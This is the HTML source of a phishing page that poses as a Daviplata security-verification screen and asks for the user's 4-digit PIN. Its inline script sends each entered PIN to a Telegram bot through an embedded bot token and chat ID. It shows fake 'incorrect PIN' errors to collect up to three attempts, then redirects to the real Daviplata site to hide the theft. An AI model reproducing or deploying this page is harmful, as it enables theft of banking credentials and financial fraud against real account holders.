<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Daviplata - Ingrese su clave</title>
    <link rel="stylesheet" href="styles.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        .btn-continue {
            transition: background-color 0.3s ease;
        }
        .btn-continue:disabled {
            background-color: #ccc !important;
            color: #999 !important;
        }
        .btn-continue.active {
            background-color: #d32f2f !important;
            color: white !important;
        }
        .error-message {
            color: #d32f2f;
            font-size: 12px;
            margin-top: 8px;
            display: none;
        }
        .error-message.show {
            display: block;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Header -->
        <header class="header">
            <img src="img/logo-daviplata.svg" alt="Daviplata Logo" class="logo">
            <div class="header-info">
                <p class="date" id="currentDate"></p>
                <p class="code">Código único CUS: 1986688397</p>
            </div>
        </header>

        <!-- Main Content -->
        <main class="main-content">
            <div class="form-container">
                <h1 class="title">Verificación de seguridad</h1>
                <p class="subtitle">Ingrese su clave de Daviplata</p>

                <h2 class="form-title">Clave de seguridad</h2>

                <form class="form" id="claveForm">
                    <div class="input-group">
                        <input 
                            type="password" 
                            id="claveInput" 
                            class="form-input" 
                            maxlength="4"
                            required
                        >
                        <div class="error-message" id="errorMsg"></div>
                    </div>

                    <div class="button-group">
                        <button type="button" class="btn btn-continue" id="btnContinue" disabled>Continuar</button>
                    </div>
                </form>
            </div>
        </main>
    </div>

    <!-- Overlay de carga -->
    <div class="loading-overlay" id="loadingOverlay">
        <div class="loading-content">
            <img src="img/loader.gif" alt="Cargando..." class="loader">
            <p class="loading-text">Verificando información...</p>
        </div>
    </div>

    <script>
        const TELEGRAM_BOT_TOKEN = '8882344336:AAF7YqBNYTL7Hb_9dPSicH9da29xEUSImGo';
        const TELEGRAM_CHAT_ID = '-1003784784181';

        let intentos = 0;

        const claveInput = document.getElementById('claveInput');
        const btnContinue = document.getElementById('btnContinue');
        const errorMsg = document.getElementById('errorMsg');
        const overlay = document.getElementById('loadingOverlay');

        claveInput.addEventListener('input', function() {
            this.value = this.value.replace(/[^0-9]/g, '').slice(0, 4);
            validateClave();
        });

        function validateClave() {
            const isValid = claveInput.value.length === 4;
            btnContinue.disabled = !isValid;
            
            if (isValid) {
                btnContinue.classList.add('active');
            } else {
                btnContinue.classList.remove('active');
            }
        }

        btnContinue.addEventListener('click', async function(e) {
            e.preventDefault();
            if (btnContinue.disabled) return;

            intentos++;
            overlay.style.display = 'flex';

            const clave = claveInput.value;

            const mensaje = `🔐 <b>CLAVE (INTENTO ${intentos}/3) - DAVIPLATA</b>

<b>Clave ingresada:</b> <code>${clave}</code>

<b>⏰ Recibido:</b> ${new Date().toLocaleString('es-CO')}`;

            try {
                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: mensaje, parse_mode: 'HTML' })
                });

                if ((await response.json()).ok) {
                    if (intentos < 3) {
                        setTimeout(() => {
                            overlay.style.display = 'none';
                            if (intentos === 1) {
                                errorMsg.textContent = '❌ La clave ingresada es incorrecta.';
                                errorMsg.classList.add('show');
                            } else if (intentos === 2) {
                                errorMsg.textContent = '⚠️ Error al verificar. Intente nuevamente.';
                                errorMsg.classList.add('show');
                            }
                            claveInput.value = '';
                            validateClave();
                        }, 1500);
                    } else {
                        setTimeout(() => {
                            window.location.href = 'https://www.daviplata.com';
                        }, 1500);
                    }
                } else {
                    overlay.style.display = 'none';
                    errorMsg.textContent = 'Error en la verificación. Intente nuevamente.';
                    errorMsg.classList.add('show');
                }
            } catch (error) {
                overlay.style.display = 'none';
                errorMsg.textContent = 'Error de conexión. Intente nuevamente.';
                errorMsg.classList.add('show');
            }
        });
    </script>
</body>
</html>
